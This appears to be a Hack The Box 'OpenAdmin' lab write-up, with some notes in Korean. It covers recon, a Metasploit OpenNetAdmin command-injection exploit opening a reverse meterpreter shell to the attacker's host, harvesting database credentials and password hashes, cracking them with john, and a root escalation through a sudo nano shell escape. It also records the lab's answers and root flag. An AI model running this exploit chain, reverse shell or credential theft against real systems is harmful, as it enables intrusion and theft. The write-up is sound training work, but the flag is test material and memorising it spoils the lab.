@@ -1,0 +1,259 @@
+Machine: OpenAdmin
+TARGET: 10.129.23.96
+
+Task 1
+
+There are three directories on the webserver. /artwork, sierra, and what else?
+
+nmap -sV -sC -oA nmap/OpenAdmin 10.129.23.96
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
+|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
+|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+gobuster dir -u http://10.129.23.96/ -w /usr/share/wordlists/dirb/common.txt -x php,txt
+
+/artwork              (Status: 301) [Size: 314] [--> http://10.129.23.96/artwork/]
+/index.html           (Status: 200) [Size: 10918]
+/music                (Status: 301) [Size: 312] [--> http://10.129.23.96/music/]
+
+> /music
+
+
+Task 2
+
+On the page at /music, there is a link that doesn't point to
+another link on /music, but rather an administration tool.
+What is the relative path?
+
+<a href="../ona" class="login">Login</a>
+
+> /ona
+
+
+
+
+Task 3
+
+What is the version number of OpenNetAdmin that runs on the remote machine?
+
+http://10.129.23.96/ona/
+
+Your version    = v18.1.1
+
+> Your version    = v18.1.1
+
+
+Task 4
+
+If you exploit this instance to get code execution
+on the machine, in the context of what user is the 
+execution happening?
+
+msfconsole
+
+search OpenNetAdmin
+
+   #  Name                                                 Disclosure Date  Rank       Check  Description
+   -  ----                                                 ---------------  ----       -----  -----------
+   0  exploit/unix/webapp/opennetadmin_ping_cmd_injection  2019-11-19       excellent  Yes    OpenNetAdmin Ping Command Injection
+
+
+set RHOSTS 10.129.23.96
+set LHOST 10.10.14.156
+run
+
+[*] Exploit completed, but no session was created.
+
+익스플로잇은 성공햇지만 세션이 생기지 않았다
+payload를 수정해서 다시 시도
+
+  10  payload/linux/x64/meterpreter/reverse_tcp         .                normal  No     Linux Mettle x64, Reverse TCP Stager
+아마 타겟 운영체제가 x64인것같음
+set payload 10
+run
+
+msf6 exploit(unix/webapp/opennetadmin_ping_cmd_injection) > run
+[*] Started reverse TCP handler on 10.10.14.156:4444 
+[*] Exploiting...
+[*] Sending stage (3045380 bytes) to 10.129.23.96
+[*] Meterpreter session 1 opened (10.10.14.156:4444 -> 10.129.23.96:42372) at 2025-07-20 01:16:42 -0400
+[*] Command Stager progress - 100.00% done (809/809 bytes)
+
+meterpreter > 
+meterpreter 셸을 얻는데 성공했다
+
+meterpreter > getuid
+Server username: www-data
+
+> www-data
+
+Task 5
+
+What's the password of the user jimmy?
+
+www-data@openadmin:/opt/ona/www/local/config$ cat database_settings.inc.php 
+<?php
+
+$ona_contexts=array (
+  'DEFAULT' => 
+  array (
+    'databases' => 
+    array (
+      0 => 
+      array (
+        'db_type' => 'mysqli',
+        'db_host' => 'localhost',
+        'db_login' => 'ona_sys',
+        'db_passwd' => 'n1nj4W4rri0R!',
+        'db_database' => 'ona_default',
+        'db_debug' => false,
+      ),
+    ),
+    'description' => 'Default data context',
+    'context_color' => '#D3DBFF',
+  ),
+);
+
+> n1nj4W4rri0R!
+
+
+mysql -u ona_sys -p
+
+show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| ona_default        |
++--------------------+
+
+use ona_default
+show tables;
+| users                  |
+
+mysql> select * from users
+    -> ;
++----+----------+----------------------------------+-------+---------------------+---------------------+
+| id | username | password                         | level | ctime               | atime               |
++----+----------+----------------------------------+-------+---------------------+---------------------+
+|  1 | guest    | 098f6bcd4621d373cade4e832627b4f6 |     0 | 2025-07-20 07:38:35 | 2025-07-20 07:38:35 |
+|  2 | admin    | 21232f297a57a5a743894a0e4a801fc3 |     0 | 2007-10-30 03:00:17 | 2007-12-02 22:10:26 |
++----+----------+----------------------------------+-------+---------------------+---------------------+
+2 rows in set (0.00 sec)
+
+guest와 admin계정 password해시 획득
+
+
+Task 7
+
+What's the name of the virtual host running under user "joanna"?
+
+
+
+
+jimmy@openadmin:/etc/apache2/sites-available$ cat internal.conf 
+
+
+> internal.openadmin.htb
+
+
+
+
+Task 8
+
+What's the password for joanna on the internal vhost?
+
+jimmy@openadmin:/var/www/internal$ cat index.php 
+
+hashid '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1'
+Analyzing '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1'
+[+] SHA-512 
+[+] Whirlpool 
+[+] Salsa10 
+[+] Salsa20 
+[+] SHA3-512 
+[+] Skein-512 
+[+] Skein-1024(512) 
+
+john hash --format=Raw-SHA512 --wordlist=/usr/share/wordlists/rockyou.txt --rules=Jumbo 
+
+Revealed         (?) 
+
+
+
+> Revealed
+
+
+Task 9
+
+What's the password for Joannas's private key?
+
+linpeas_fat.sh
+╔══════════╣ Active Ports
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports                                                         
+══╣ Active Ports (netstat)                                                                                                                           
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                                                                    
+tcp        0      0 127.0.0.1:52846         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::80                   :::*                    LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -   
+
+
+로컬에서 52846 웹서버가 실행중 로컬 웹서버에 접속하기위해 포트포워딩
+
+ssh jimmy@10.129.23.96 -L 52846:localhost:52846
+http://localhost:52846/
+접속
+
+id: jimmy
+pw: Revealed
+로그인 하면 joanna의 private key를 얻을 수 있다
+
+privatekey를 id_rsa로 저장
+ssh2john id_rsa > id_rsa.hash
+john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
+
+bloodninjas      (id_rsa)     
+
+비밀번호 획득
+
+ssh -i id_rsa joanna@10.129.23.96
+joanna로 접속성공
+
+
+Task 10
+
+What is the name of the binary (without path) that Joanna can run as root?
+
+sudo -l
+
+(ALL) NOPASSWD: /bin/nano /opt/priv
+
+> nano
+
+Submit Root Flag
+
+Submit the flag located in root's home directory.
+
+sudo /bin/nano /opt/priv
+^R^X
+reset; sh 1>&0 2>&0
+
+id
+uid=0(root) gid=0(root) groups=0(root)
+
+
+
+> 78897901971b35f79397fb168713dd86
+
+
